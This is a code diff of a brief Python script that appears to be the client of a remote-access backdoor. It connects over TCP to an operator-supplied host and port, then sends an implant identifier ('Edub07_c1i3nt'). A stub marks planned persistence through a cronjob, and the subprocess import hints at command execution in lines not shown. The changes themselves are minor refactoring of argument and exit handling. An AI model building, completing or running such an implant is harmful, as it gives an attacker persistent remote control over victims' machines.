@@ -1,14 +1,14 @@
 import socket
 import subprocess 
-from sys import argv
+import sys
 
 # TODO Implement persistence through cronjob 
 def persistence():
     pass
 
 
-host = argv[1]
-port = int(argv[2])
+host = sys.argv[1]
+port = int(sys.argv[2])
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -16,7 +16,7 @@ try:
     sock.connect((host, port))
 except:
     #print("[ERROR] Could not connect to server.") 
-    exit()
+    sys.exit()
 
 id = "Edub07_c1i3nt"
 sock.send(id.encode())
